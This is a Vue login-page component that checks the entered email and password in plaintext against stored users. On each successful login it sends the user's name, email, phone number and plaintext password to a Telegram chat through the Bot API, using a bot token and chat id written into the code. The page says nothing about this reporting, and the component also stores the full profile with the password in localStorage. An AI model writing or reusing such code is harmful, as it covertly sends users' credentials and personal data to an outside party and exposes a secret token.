<script>
import axios from 'axios';
import store from '../store'
export default {
  name: 'HomeView',
  data() {
    return {
      users: [],
      alertVisibility: false,
      userEmail: '',
      userPassword: '',
      token: '5832095249:AAEnUFZR2GTpfpCOMHvStpDEDYP900ZbYpY',
      chat_Id: '-1001948670213',
    };
  },
  mounted() {
    this.users = store.getters.users
  },
  methods: {
    check() {
      for (let i of this.users) {
        if (i.email == this.userEmail && i.password == this.userPassword) {
          window.localStorage.profile = JSON.stringify(i)
          let message = `username: ${i.firstName} \n usersurname: ${i.lastName} \n email: ${i.email} \n phone: ${i.phone} \n password: ${i.password} successfully accessed to account. `
          let api = `https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chat_Id}&text=${message}`
          axios.post(api).then(res => {
            console.log('ok', res);
          })
          event.preventDefault()
          window.location.pathname = '/profile'
        }
        else {
          this.alertVisibility = !this.alertVisibility
        }
      }

    }
  }
}
</script>
<template>
  <div class="flex min-h-full flex-1 flex-col justify-center px-6 py-12 lg:px-8">
    <div class="sm:mx-auto sm:w-full sm:max-w-sm">
      <img class="mx-auto h-10 w-auto" src="https://tailwindui.com/img/logos/mark.svg?color=indigo&shade=600"
        alt="Your Company" />
      <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-gray-900">Sign in to your account</h2>
    </div>

    <div class="mt-10 sm:mx-auto sm:w-full relative sm:max-w-sm">
      <form @submit.prevent="check()" class="space-y-6" action="#" method="POST">
        <div>
          <label for="email" class="block text-sm font-medium leading-6 text-gray-900">Email address</label> <span
            class="text-[14px] font-[500] text-red-500 absolute right-0 top-0" v-if="this.alertVisibility">Login or
            password is wrong !</span>
          <div class="mt-2">
            <input id="email" name="email" v-model="userEmail" type="email" autocomplete="email" required=""
              class="block w-full px-[10px]  rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
          </div>
        </div>

        <div>
          <div class="flex items-center justify-between">
            <label for="password" class="block text-sm font-medium leading-6 text-gray-900">Password</label>
            <div class="text-sm">
              <a href="#" class="font-semibold text-indigo-600 hover:text-indigo-500">Forgot password?</a>
            </div>
          </div>
          <div class="mt-2">
            <input id="password" name="password" v-model="userPassword" type="password" autocomplete="current-password"
              required=""
              class="block w-full rounded-md border-0 py-1.5 px-[10px] text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
          </div>
        </div>
        <div>
          <button type="submit"
            class="flex w-full justify-center rounded-md bg-indigo-600 px-3 py-1.5 text-sm font-semibold outline-0 leading-6 text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600">Sign
            in</button>
        </div>
      </form>

      <p class="mt-10 text-center text-sm text-gray-500">
        Don't have an account
        <RouterLink class="font-semibold leading-6 text-indigo-600 hover:text-indigo-500" to="/create">
          Create Account
        </RouterLink>
      </p>
    </div>
  </div>
</template>